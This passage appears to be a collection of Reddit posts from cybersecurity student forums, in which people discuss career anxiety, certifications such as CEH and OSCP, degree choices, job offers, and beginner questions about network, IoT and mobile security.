pentester or security auditor, I really do, it's just... I'm very tired. Everything seems so daunting, and I don't have an option to take a couple years off to see if this is what I really want and *then* finish my degree. My dad makes fun of people who do that. I've already foolishly used up an elective slot, so taking a class for a coding language (something else I feel obligated to do) is out of the question. I don't know if I'm actually mentally ill, lazy, undisciplined, or some strange cocktail of the three. I'd bet on the cocktail, but in reality I'm probably just messed up on whatever BS social media fed me in my more formative years. Whatever the case, I think my biggest fear is trying to put myself out there by networking or applying for IT jobs with only cert-related experience and never getting anything. I also have a big fear of sounding stupid by saying the wrong thing, or suggesting an incorrect solution, or screwing up where it really counts. I want so desperately to separate myself from my expectations and my anxious thoughts and sort out whatever is going on in my head before I take any more steps into cyber, but I can't. I have to keep moving forward or I'm going to get shamed to hell and back. So I guess the best I can do is balance the load as best I can and truck on. I'm planning on seeking therapy soon, so hopefully there will be no more posts like this, but it's slow going because of family reasons. Please let me know if this isn't the appropriate place for this. I'll show myself out. Tl;dr: I'm anxious and mentally ill(?) as all get out and I have family issues and expectations (self and external) that prevent me from focusing on getting that under control before I continue on the pathway to a career that I know I'm gonna love in infosec. Money is also a hot-button issue. I feel like I'm dying, and I know other people have had it and will always have it much harder, but I'm burning out on everything. Even the field that I love, and the things that I love. Please send help."

I worked towards it but couldnt find any. Fortunately, while studying a course I stumbled on it. I can actually say this group and the comments would give any one bold steps to forge ahead, Its a pleasure to be part of a group of amazing people who has a flair for cybersecurity. I started learning pentesting few months ago on Udemy. Im excited and passionate about it, totally love it. The more I do it, the more deeply enthralled I become. After few months of relentlessly working on it day and night, getting familiar with many tools on Kali, I would say I have reverence for this. Im still a beginner, going on the intermediate level, however, I would be of great help to others who are on this journey by contributing the best of what I know. Im disciplined and relentless and if given a chance I promise to add value to the group In general. We can all win together and come out strong. It would be awesome if I can find a private partner/group which we can continue on this beautiful journey of cybersecurity. We can crush exams together and win big. Although all this has to be done via online as I live in South Africa. Kindly get through to me if youre interested. Cheers."
209,cybersecurity,netsecstudents,SANS announces new Undergraduate Certificate program,10,c2q9lx,https://www.reddit.com/r/netsecstudents/comments/c2q9lx/sans_announces_new_undergraduate_certificate/,2019-06-20 12:25:57,"SANS has just announced a new [undergraduate certificate program](URL in cybersecurity. Some quick notes: 1. Unlike their Master's program, no previous industry experience is required for admission. They do require two completed years of college, making it ideal for those finishing up two year degrees at community colleges or those enrolled in a four year CS program that are not getting the exposure to infosec they desire. Also appropriate for those that have finished a non-technical undergraduate degree but are looking to transition to a career in infosec. 2. The program is not degree conferring, but rather a complement to some other degree you might obtain. 3. The program looks to be very ""hands on"" with little BS. There is an intro infosec class and then three GIAC certifications, the GSEC, GCIH, and an elective of your choice. 4. Courses can be completed online or in person at various SANS events around the country. These SANS events can provide great networking opportunities. 5. The program is not cheap, clocking in at a cool $22K. While this might seem prohibitively expensive keep in mind that SANS often offers flexible payment plans and completion of the entire course would likely boost an entry level SOC analyst making $50K a year to eligibility for a much more senior position in the $75K to $80K range. That's a fifty percent increase in salary with the program essentially paying for itself in about a year and a half. 6. Fortune favors the bold."

And from my research, communication (between end-user-to-robot, robot-to-robot, or robot-to-cloud/server) is one of the major failing points in security for robots. From an end-user perspective, I did some research to find out how to best secure a robot. And pretty much all of them were either on how to build securely for the robot manufacturers/developers, or a 5-step list like, change the default password, read the terms and conditions, think about whether you really want to be connected, keep the software updated, and research the manufacturer/developer to see their stance on security. As someone who is familiar with coding, but not really with networks or security in depth, I wanted to ask you all, is this really all I can do? I mean, they're good advice, and I know only the manufacturers/developers of the robot can actually make a difference, but I was hoping for advice on something more than I could do to secure the robot. I did see some recommendations to use a VPN when I specifically searched for it, but does it really help secure the robot? For example, could it prevent an unauthorized person from getting access to my robot's camera by pretending to be the server or an authorized user like me? And does anyone know of anything else I can make/do/set-up to better secure my robot? (Or at least some security terms I can throw out to search for more specific tech/method?)"

I got a random message from a recruiter on LinkedIn two weeks ago telling me about a program they were doing for undergraduate students that allowed them to get security clearance and a job afterwards, so I applied to it. A little while later, I had a phone interview for this same program, and two days after the phone interview, they give me an offer for a cybersecurity job that I could take right after finishing college (even though I'm just a freshman???). I accepted anyways without thinking about it because I wasn't having much luck with internships and I just wanted to be able to get something and this sounded kinda cool. However, after I spoke to some family members, some of which are in the IT field, they all told me that they found this offer kind of strange. I only had one interview, and it just involved the guy who was interviewing me asking me about some of the stuff that was on my resume. The guy who was interviewing me was just some HR dude who didn't even seem to really know much about technology, let alone cybersecurity, so impressing that guy wasn't even that hard. I just told him about some of the projects I did in the past and how I'm involved in my university's cyber club. I did make it clear that I was a freshman in college, but even so, they told me that they were going to push me to get security clearance, and after I get clearance they said that they would give me a job when I graduate. They are offering me $85k/year. The company isn't too well known, but it's still a big company that works as a gov. contractor and they seem legit. But I'm just kind of concerned because who gives a job offer to a freshman? Without even meeting them face-to-face even though I only live 30min away from the company? Is that normal in this field? Don't most companies just give internship offers to freshmen (if they give any offers to freshmen)? My family is telling me to consider rescinding my offer to them because they seem a little bit fishy; should I do that?"

I was looking at the CEH but to me it doesn't make sense to get it when I don't have any networking certs except Net+ but that is an entry level cert. I was thinking of doing CEH after I get my degree or when I am about to complete it. What cert should I get after CCNA if I want to pursue cyber that will help me get an entry level cyber security position? I have heard from many people and on forums that Sec+ does not necessarily help one get a cyber security job, even an entry level one. I was thinking of doing the following: CCNA-&gt;CYSA-&gt;CEH. Hopefully during that time I will get some hands on IT security experience. "

During and after I graduated college I found myself more and more interested in the realm of cybersecurity, I'm extremely eager to learn as much as possible. In my job so far, I frequently stumble across people asking for certain ports to be opened for x program or y configuration. I want to address these questions but I'm still learning and not sure where to begin. I am assuming IANA unassigned ports and other obscure ports are probably best avoiding just to keep things simple? I've tried googling some port numbers that I am somewhat unfamiliar with and generally I just get a ton of information regarding some common programs/services that use a port but nothing that I can make sense of enough to make a proper judgement call. So I'm wondering what the general feedback would be for: 1. **From a network security perspective, what ports are generally considered 'safe' and what ports are generally considered 'unsafe' or more risky?** 2. **What are some questions you ask users or yourself when making a determination when someone requests a certain port to be opened? Am I oversimplifying this too much?** &amp;#x200B; Thanks!"

In my opinion, finding and getting a job in a Cybersecurity field is relatively more difficult than in another area such as SWE. I have a couple of friends who were doing just okay in college (3.0 GPA, none/ one internship experience, etc.), but now they are working at Apple, Google, Amazon as Software Engineers. I, on the other hand, barely got a job in Cybersecurity field. Currently, I'm working at a start-up as a Support Engineer (not 100% dealing with security stuff). So my questions are: Why it is much easier for someone to get a job as an SWE at big companies? What should I do from now on to be able to reach the level where my friends currently are (i.e., working at big companies as a REAL Security Engineer).

As the entire ecosystem of the IoT evolves and expands, the wide range of functions and supporting components involved are resulting in significant security and ultimately privacy challenges that need to be addressed. The applications of IoT into corporate and business environments suffer from very similar security and privacy concerns as implementations that expand existing Operational Technologies (OT) networks through the interconnection of smart sensors and actuators with integrations into cloud computing platforms to create intelligent infrastructures create vital links within energy, transportation, manufacturing, and automation. The Research Purpose: The purpose of the proposed qualitative study is to explore, the experiences of Information Technology professionals who have practical knowledge in implementing Internet of Things systems and devices within a business or corporate setting and their perceptions of the security risks to these systems, giving rise to a better understanding of the security and privacy concerns that must be overcome. The research question: What are the experiences of Information Technology professionals who have implemented Internet of Things devices and their perceptions of the security risks that these devices pose? This exploration may lead to a better understanding of the security implications of a technology that is rapidly growing but the security implications are overlooked within business environments due to a false sense of security. Research study participation: For data collection, this research study needs at least 10 participants for semi-structured interviews with an additional 2 for a pilot phase to fine-tune the questions. The interviews will be conducted via Skype video conference calls in a nationwide scope. The primary focus of participants will be individuals who have current experience in implementations within a professional or business environment. Additionally, participants should be identifiable IT professionals. Each participant will answer about 10 interview questions. Interviews will likely be no longer than one hour. Benefits of Participation: There may or may not be a direct benefit to participants in the study, but we hope to further the knowledge required to implement IoT Devices into business settings that will help organizations to improve their security posture that could indirectly benefit everyone. Your contribution will be recognized and acknowledged in the dissertation. You will receive the following payment/reimbursement: $50 Amazon Gift Card for participation, presentable upon completion of the interview. Confidentiality: During the data collection and data analysis, every effort will be made to ensure that participants of the study will in no way be able to correlate their responses to their identity; the information will be coded to mask participants identities and ensure the confidentiality of the respondents. The data and records will be stored within an encrypted offline medium, and this will be stored within a locked container. Only the researcher will be allowed access to the data and the records, and once the study is complete, the data and records will be securely destroyed.

Yes I am aware that there are other certs or programs that I would be better off pursuing (and I will get to those as well), but the kinds of jobs I'll be applying for all seem to require the CEH in order just to get past HR. I'm looking into cybersecurity in the public sector, especially law enforcement and intelligence agencies, and they all seem to have the CEH as one of their required certifications. I've been looking into the process of getting the certification, but am both confused by the requirements, as well as some anecdotal evidence about who can take it, how they take it, and when they take it, so I've come here for more definitive answers. I'm looking for the answers to the following questions: How much does it cost? Can you get the eligibility application approved if you're still in college with experience working in IT (not necessarily security related) How does one get into the EC-Council training program if their eligibility application was denied? Also, what the difference is between CEH ANSI and CEH Practical exams? &amp;#x200B; Again, I know the security field doesn't look too highly upon the CEH, and I understand the reasoning behind that.

That's all well and good. That should be a pretty basic standard when you're providing this kind of service. Here's where it gets interesting. As part of the review that my team performs, we ask how vulnerabilities are remediated. Here's the answer that we've gotten: *""&lt;software/application that they've written internally&gt; maintains a clear separation between various systems. The policy is enforced realtime and on a continual basis. It is simply impossible to access any internal systems without first authenticating, authorizing role, and providing an intent. &lt;Vendor&gt; follows a zero trust policy for cybersecurity.""* This seems really off to me.

The first year I was purely a software engineer and the last half year I have been both a Software and Cybersecurity engineer. My certifications - I am a OSCP and an Associate CISSP (passed exam, don't meet experience requirement yet - still satisfies same 8570 requirements). Also I am in the process of getting a TS clearance (have my interim TS). I want to be a security engineer. I enjoy technical work and love taking on challenges. However, the ""cybersecurity"" jobs at my company seem to be mostly just accreditation work which is incredibly boring and tedious. None of it is very challenging work and I can't help but feel that I have gained no marketable skills from my time here. I'm about ready to jump ship and seek other opportunities but the main thing holding me back is the clearance. Is it worth waiting for that to finish before jumping to another contractor? Will the next contractor even be any better than this one? Should i give up on the clearance completely and just go for non-government positions? What would be the best career path for me, as someone who enjoys technical work and wants to continue my career in security? I want to work on something challenging and technical. I enjoyed OSCP and penetration testing is very fun, but it seems it is not as lucrative as security engineering or software engineering - is this true? I also don't want to pigeon hole myself into just Red team work - I want to be able to do offense, defense, software, architecture, etc. I would appreciate any advice on what type of roles I should be looking into, what I should be focusing on studying and improving in my free time, or anything else.

Throughout my time being president of this club and giving presentations is that it is very difficult to do follow along activities related to cybersecurity due to the skill differences in the students and the nature of the field. That being said at the end of the day when it comes to cybersecurity the first thing students jump to is penetration testing/hacking. This is what generates initial interest and the business major in me realizes this is how I grab an audience. So to the point of this post, I was curious to see if anyone had any recommendations for a CTF VM that would be a good intro level yet challenging VM that would let students learn new things as well as feel accomplished. Some of the VM's I have seen require reverse shells and ultimately screwing with the original VM config. In order to streamline the presentation I will be hosting the CTF VM on a computer then using a router to create a LAN that the students can connect to and simply just attack the box rather than having to set up their own pentest lab on their computers. This also means though that to complete the challenge they have to be able to complete the steps. I don't want the success of one student to hamper the possibility of success for another student. With that being said I am open to any other ideas for a cybersecurity presentation. Usually at our general body meetings for the clubs we talk about major issues and dissect some major breaches and look at some basic tool usage. I want to make this fun and interactive without having too much overhead on the students. Any help would be greatly appreciated.

My history, for the last 3+ years I have worked as a fraud analyst / senior fraud analyst in a large e-commerce organisation that is heavily exposed to cybercrime. My daily focuses were primarily based on: &gt; financial fraud prevention - money in money out ect &gt; Customer facing security - account take over, attempted account take over, reducing the risk on customer accounts (customers that have been breached by third party vendors ect) &gt; Risk and compliance - aml, ctf, pii, pci related projects &gt; Worked on cybersecurity group focused on the continuous improvement of our abilities to protect our business and our customers. This would range from assessments on new product releases (internal and products that could help our business), improvements to existing practices, discussing cybercrime trends and when larger attacks take place i.e credential stuffing attempts ect representing our department for the customer-facing defences and communication. Day to day I generally use data analytics to identify the trends we are facing (primarily sql, some basic R and basic python in conjunction with visualization software). Then do the hard yards addressing the business with timelines, budgets, dev requirement ect. My plans now are to transition into a technical netsec position. However, I obviously have large gaps in technical experience, I have mapped out a development path I plan to take (I am not currently working and have a lot of spare time to study my A** off), please feel free to chime in and suggest if something is useless or a course/certificate that could fast-track my progress. &gt; Comptia A+ &gt; AWS solutions Architect (My reason for this is I have exposure to aws - preparing for the exam is forcing me to learn essentials I would not have considered otherwise).

Internet is a wonderful media, but having access to so much information with no control is like having no access at all. What path could provide the tools to become a self-sufficient Security expert in the shortest time? I imagine plenty of wannabe professionals living the same discomfort, feeling completely alone between thousands of Subject Experts. When I first stumbled upon Security, it was trough Caesar Cipher. For me, it seemed the most exciting thing in the world and that day I decided I would have spent all my time unveiled all secrets behind Cybersecurity. Unfortunately, life has taken me on different paths, too far from the object of my ambition. I had two options: to accept it or fight for it! How easy would my life be had I been able to let things go. How could I steer it again in the right direction? I remember myself analyzing plenty of CVs to find out what path other people had followed to get where they were. They must have started from somewhere, right? Maybe if I had been able to mimic their choices I would have arrived there, too. Finally, my eye fell onto an unknown certification: **eLearnSecurity Certified Professional Penetration Tester (eCPPT)**. Never heard of it! I found out a colleague of mine had already completed it and strongly suggested me to try. Buzzwords like practical, labs, hands-on were still echoing in my mind. So, I bought it. No trials, no reviews, just faith in work relationships, the foundation to become Security professionals. My impressions in brief: - **CHEAP:** I could afford it. Thats it! InfoSec certifications usually assume your organization would pay for them, but this is not the case and I think trade-off cost-benefits is really worth a try. - **EXHAUSTIVE:** The course includes everything you need to start your Cybersecurity career. Divided into 5 modules (Web, Network, System, Metasploit and WiFi), it offers PDFs, videos, codes and any kind of additional material to ease the learning process as much as possible. It felt like owning a personal library always available and ready to be consulted. Additionally, some of provided knowledges (such as Shellcoding or Buffer Overflow) are totally enabling to other Security advanced certifications and topics. - **SELF-SUFFICIENT:** No particular previous knowledge is required. The course does not take anything for granted and effectively explain all requirements needed to completely understand discussed topics with an impressive level of detail. The overall feeling is that nothing is there for no reason. - **PRACTICAL:** Labs, labs, labs and labs again. Paper-Security is not effective if not put into practice. What did Beckett say? Ever tried. Ever failed. No matter. Try Again. Fail again. Fail better. - **APPEALING:** The course offers a perfect balance between text and graphics, in the idea that visual representation is a better way to pin concepts than hundreds of words. Between the infinity of tools and certifications, I will always remember eCPPT course as the first true step I have taken in my professional career. What really gave me the self-confidence to try mastering this complex and deep subject. Security is all about knowledge and experience. Mostly important, security is a method where everyone can give a real contribution in his own way. No shortcuts. No definite roads. Only knowledge and confidence. Do not take anything for granted; deepen, contaminate, learn, trust in yourself, with a clear idea of the direction you intend to take. It wont be easy. You can decide to give up or try. Your choice."

Now, my level of computer networks is not that good and I heard that's one of the fundamental skills to have for InfoSec, so I'm trying to find good resources on that, but the problem of searching for computer networks resources is that I find people that are REALLY serious about learning it to become, for example, network engineers...

I'm going to go back to school, most likely WGU. I read an article a while back saying basically that Cybersecurity degrees are a waste compared to getting a more generalized degree and specializing after gaining some experience. My question is whether it's more beneficial to get an IT degree with Certs or Info Sys Security degree with Certs. Any ideas? I'd get the degree and work as an admin or something for a while and learn whatever else I need at the time. Question 2. I'm having a hell of a time downloading usable Linux distros. I'm trying to get Kali, Parrot, or Backbox (in that order, preferentially), but the only ISO I'm able to successfully put on a bootable USB is Ubuntu. Is there some trick to this? I have been using Rufus to create the bootable USB with the respective ISO, but it always shows as having an error when trying to boot to install. Would using the Kali tool pack with Ubuntu be just as good for learning that stuff? Thanks! (Oh, and I'm taking cert courses, Sec+, Net+, A+, Linux+, through cybrary, and will hopefully find somewhere for CEH and CISSP, after I get a little further along. Any others that I should do?) "

I'm the only one without a degree even though I have CISSP, CSSLP and I'm getting a CISM. I didn't finish my bachelor degree as I could not afford to attend full time and I had to work, long story short I dragged the bachelor degree in CS for 15y and fast forwarding to now I have three exams to go. Close to my new office there is a college and they are going to provide evening classes to get an MSc in CyberSecurity, due to my experience they will accept me in the MSc courses even if I've not officially finished the BSc so basically I would be able to get an MSc in 2 years part time.

I'm currently attending a public University majoring in Cybersecurity. I just recently switched over from a different major, so I have most of my prerequisites done but have done basically nothing in the way of coursework (outside of a little programming). From what I've gathered, the degree program I'm in is very much theoretically oriented, with little in the way of actual technical hands on experience (essentially it's a computer science major with some elements of Cybersecurity). After enrolling in the program at the University, I discovered that the local State College (used to be a community college but switched over and became regionally accredited, meaning that the State College has the same level of accreditation) also has a cybersecurity program. Initially I didn't even consider looking at their courses as generally their programs are fairly shitty (I've known multiple people who have gone there and all sing the same tune). The kicker here is that apparently their cybersecurity program is actually pretty good (I've met multiple people who have switched over to their program and said as much) and is significantly more hands on and technically oriented than the University degree which I am currently pursuing. Not only that, but the cost per credit hour is significantly cheaper (though that's not a major consideration in this case, my financial aid is sufficient either way). So given the facts, and given that I stand to lose essentially nothing in the way of time or money if I transfer this semester, I'm strongly considering switching from the University to the College (the University being the theoretical computer science and the College being the more technical and hands on one). My question for reddit is, would there be any merit in deciding to remain in the program in which I am currently enrolled? It's also worth mentioning for context that the program which I am currently in offers no certifications, whereas the one which I am thinking of transferring to gives (among other certs), several CompTIA certs (including Security+) , CCENT and CCNA, several windows certs, and several MILE2 certs among other things.

I have a long time before I take my major-oriented classes (obligatory OOP class, Networking, Auditing, IT Security Management, DB Management). I have until my junior year until I get to take those classes. In the meanwhile, I have to take my required core classes of English, Math, History, science and all that. I don't want to be twiddling my thumbs while I wait for junior year to come around. I'd like to spend my time wisely and build my skills and explore my interests. I've read wikis, posts, and have heard from coworkers (I work at an MSP, and I'm grateful for the opportunity there). I'd like to explore upon a few things: - Web Development. Apps and websites, how to build (and break) them. - Server/SysAdmin side of things. I'd like to learn how Linux and Windows Servers are set up, maintained, and broken into. - Networking protocols, concepts, and architectures. - Scripting/High-level programming. I'd like to learn Python, as well as BASH and Powershell. To fulfill all of these things that I want to do, I have the following points of action: - Certifications. I'd like to have some under my belt before graduating college that take care of the Networking and SysAdmin side of things (MCSA, CCNA, RHCSA/LFCSA). Perhaps I could also get started with entry-level security certs as well (Security+, for example.) - Building a blog. That will take care of the Web Development part, as well as having the opportunity to document my journey. Looks great on a resume, too. - Building a home lab. Something to practice building servers and breaking into vulnerable systems. - Reading up on Python. I'd like to use it for automation and building small tools. One project I'd like to get into is building a web scraper. Now, I'm not looking to get all of this done in two years. It looks very ambitious, that's for sure. Maybe there's some parts that I don't need. Maybe there's other things that I do need to know/delve into. I'd like a second opinion on this. What do you guys think?

368,cybersecurity,netsecstudents,Networking for Information Security/Penetration Testing,9,4tfafb,https://www.reddit.com/r/netsecstudents/comments/4tfafb/networking_for_information_securitypenetration/,2016-07-18 23:53:26,"Hello Reddit's amazing community, this is my first post ever on the internet, so kindly excuse my faults. And I apologize for the long post in advance, but I really need your help, as my whole future depends on your help, and this important post. I am interested in Information Security, in fact, I have a strong passion in it, and that's why I chose IT Security over Medicine, Passion over Money/Prestigious. So I decided to make it my job field. I am enrolled in a Computer science program in a university, 1 month and 12 days left for it to start. I plan to have a master degree in CyberSecurity/IT Security if it's worth it. I have prior experience in hacking some machines, but nothing major, I was just a script kiddie unfortunately. And as I want to be a professional hacker/penetration tester, I am building the right strong skillset, including programming, networking, operation systems...before I start hacking any machine, or studying any security related degree/certification. I reached the part of my plan where I learn networking, my plan was like this: Network+ &gt; CCENT &gt; CCNA R&amp;S. I was planning to study them now, and take the exams in my last university year. The main reason I wanted to have those certification (or the CCNA R&amp;S) in my resume is to approve that I understand networking. So, I got the ""CompTIA Network+ All-In-One Exam Guide, Sixth Edition(Exam N10-006)"" Mike Meyer's book, and got shocked by how much information is need to be memorized in order to pass the exam, and understanding that information (which is the only needed in the real world field) isn't enough to. And, this is just the basic network+ cert., so the CCNA R&amp;S has much more to memorize (probably 1000+ pages). Also, all that memorization is not needed in the security/hacking field, I just need to understand TCP/IP, know how to pivot, understand wireshark, understand how firewalls work..I don't need to know how to configure 100+ switches with 30+ firewalls, and some load balancers, that is the networking man job. I understand that to hack a network protected using a firewall, and an IPS for example, i need to understand both of them in order to hack it, and that's what I am gonna do, I want to understand and memorize what's needed for hacking, but not 4000+ pages of networking at least. And i am gonna deploy that practically in labs. I am gonna configure switches, routers, firewalls, IPS &amp; IDS.., but I am not gonna memorize tons of things, just to pass a certification, that I am not gonna use, neither in the job, nor in my own hacking journey. Then, I kept thinking, is studying them using ""books maybe + cybrary + labs -packet tracer, virtual networks using vmware workstation-"" enough to fill this gap ? I checked indeed.com to see some job posts, and what they require, and no one required having those certifications, just a few required understanding TCP/IP. This same thing applies to Microsoft, and Red Hat, I planned to get some of their certifications, to approve that I understand Windows and Linux, but i think there is no need anymore. I can self-study them without getting a certification, for my knowledge base only, and focus on the security certifications, so I can now achieve the CEH (just to pass the HR), OSCP, maybe elearnsecurity (their courses are good, but their certifications are not well known unfortunately, so I don't know if it will help me getting a good job), and much more. And I thought, doesn't achieving OSCP approve that I understand the needed knowledge to do a penetration test ? Such as TCP/IP understanding, wireshark, linux, windows, scripting...as this knowledge is required to pass it! So, I can approve it to the employer this way. So now, I can achieve some important security certifications within my bachelor years, then I can join a master security degree if it's worth it (in USA or EUROPE) OR I will get a good security-related job immediately after graduation (I don't study in USA or Europe currently, but I would like to work there, as the people there appreciate Information Security much more than here), and then, I will start harvesting SANS certifications -i wish i can afford them on my own now-, and after some years, I will get the CISSP, and maybe then I can work as a CISO! Which is my goal, to be a CISO (As I know, it's the most paying and prestigious job in this field). In the same time, I will study security books as much as I can, I will build my own lab, I will use vulnerable machines such as the vulnhub's ones, i will use ctf365.com, I will stay up to date with security news and vulnerabilities, I will donate to penetration test local companies, i will attend CTFs, conferences, and bug bounty programs, I MAY make a blog, and I will do my best to fill up my resume (I will make a seperate post to gather as much as possible on what things can help my resume). You may ask, why did I post this if I already made my decision ? I didn't. I am still worried what is the right thing to do, that's why I need your help. I don't know what is better. I don't know if my path will work or not. I apologize for the long post. I hope you answer my following questions, and I appreciate any additional advice and suggestions. I hope you correct and direct me to the right path. My whole future depends on your help. 1. Can I get a security-related job immediately after graduation (I mean my first job is security-related one) with a CS BA degree, CEH cert., OSCP cert., and the self-study stuff that can be put on the resume (such as: books, online courses, achievements, donations, a blog, CTFs, conferences, bug bountry programs...) ? 2. Is my plan/path realistic ? 3. Can the CISO level be achieved this path ? (I think I need a management/Business certification to be a CISO) 4. Additional notes, advice, and suggestions are appreciated. Thanks in advance. -LonVenu | Reddit"

She received a media file (MP4 as I recall) from the alleged hacker before the phone started acting weird. This leads me to suspect Stagefright. Is there a way to detect the presence of the Stagefright exploit by analyzing the media file? Since she received the file, she's been logged out of her accounts and had information deleted from these accounts. This fits with the supposed motives of the individual who sent her the file. Is there a way to confirm the presence of a remote shell on an Android device? Is there a file or process we should be looking for running on the phone? We'll be doing packet capture to see if it talks with a C&amp;C server. Should we setup a MITM security certificate to decode TLS traffic? Hopefully the guys that I'm working with have thought this through better than I have. I'm working with some more experienced netsec guys on this forensics analysis (if you can call it that). However, we all identify as students and not nearly as knowledgeable as you wonderful people. A local cybersecurity firm told us that we needed to gather evidence before the police will be willing to investigate, thus we're doing a preliminary investigation."

371,cybersecurity,netsecstudents,I think I've wasted tens of thousands of dollars on a worthless degree,46,4eget9,https://www.reddit.com/r/netsecstudents/comments/4eget9/i_think_ive_wasted_tens_of_thousands_of_dollars/,2016-04-13 00:48:20,"After 5 years of studying, I recently graduated with a B.S. in Cybersecurity believing that the job world would be my oyster. ""There are SO many security jobs available. I'll have employers fighting over me. Six-figure job, here I come!"" However, after months of fruitless job-searching, do you know how many emploers/recruiters have asked about or even mentioned my degree? Not a single one. Zero. Zilch. Instead, the same 3 questions come my way, ""What's your previous security work experience? Do you have an active clearance? Do you have a CISSP?"" ""None, no, no."" ""Oh. Ummm...we'll, uh, be in touch."" In the meanwhile, my student loan payment of $637 is still due on the 13th of every month. The truth is, after these past few months of applying for jobs, talking to various people, and reading various forum posts, I've come to a epiphany: your degree is just a checklist item - beyond that, no one cares. Security? You could just as well major in English. It's not going to open a magical portal to a wondrous world of career choices. Recruiters are not going to be beating down your door with Cyber Analyst &amp; Engineer offerings (you will get a shitload of offers for sales positions, however). The degree is just a tick box to get recruiters &amp; hiring managers to read the rest of the resume instead of immediately tossing it into the ""round file"". In fact, if you already have relevant security experience on your resume, you probably don't need the degree at all. I already knew this applied to certifications but, for some reason, I thought degrees were different. My uptake from everything I've learned so far about getting a career in security? **GET WORK EXPERIENCE TO PUT ON YOUR RESUME**. Get an internship. Take a side-job. Find a way to take on security-related responsibilities at work. Take a look at job postings and get your hands on the technologies people are asking for. Do something, anything, so you can honestly put security-relevant work experience on the resume. You're only in your freshman year? PERFECT time to start! You'll have even more experience by the time you graduate! Also, if you're working, or are interested in working, in government-support roles (which are the vast majority of job openings in my area), find a job that will sponsor you for a clearance. Even if it means finding another job at the exact same position, just with a clearance. Active clearances will give you a step up on the competition more than the degree will. In the meanwhile, I'm going to follow some of the other advice I've read and switch my job search over to systems administration. Maybe I'll have better luck there. TL;DR - Experience is not just &gt; degree/certs for security jobs, it is the be-all, end-all. Do it. Do it now."

Usually I tend to go against the current, as the college continues to push a cybersecurity degree as if you can just hop in with a 2year A.A.S and make 250k working for the NSA, and push my students to realize they need to start as help desk support or junior system admins and LEARN everything they can to be able to get into security and make something of themselves. I also harp on them every week about learning Linux ( a lot have no idea how to use it) and teaching themselves a language or two, I tend to lean towards Python. I would say 99% of my course is trying to get them to realize that they need to find answers on their own for a lot of the shit out there, and how to use Google effectively is a HUGE skill to have nowadays.
